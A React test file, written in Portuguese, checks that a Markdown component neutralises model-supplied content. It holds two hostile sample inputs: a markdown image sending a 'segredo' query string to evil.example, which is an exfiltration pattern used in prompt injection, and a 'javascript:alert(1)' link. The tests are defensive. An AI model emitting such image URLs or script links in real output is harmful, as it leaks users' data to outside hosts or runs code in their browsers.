import { render, screen } from "@testing-library/react";
import { expect, test } from "vitest";
import { Markdown } from "./markdown";

test("imagem remota do modelo não vira <img> nem preload; aparece como link em português", async () => {
  const { container } = render(<Markdown>{"![p](https://evil.example/p.png?d=segredo)"}</Markdown>);
  await screen.findByText(/imagem:/);
  expect(container.querySelector('img[src^="http"]')).toBeNull();
  expect(document.querySelector("img")).toBeNull();
  expect(document.querySelector('link[rel="preload"]')).toBeNull();
  expect(screen.getByRole("link", { name: "p" })).toHaveAttribute("href", "https://evil.example/p.png?d=segredo");
});

test("link com protocolo perigoso vira só o texto, sem '[blocked]' em inglês", async () => {
  const { container } = render(<Markdown>{"[clique](javascript:alert(1))"}</Markdown>);
  await screen.findByText(/clique/);
  expect(container.textContent).not.toMatch(/blocked/i);
  expect(container.querySelector("a")).toBeNull();
});
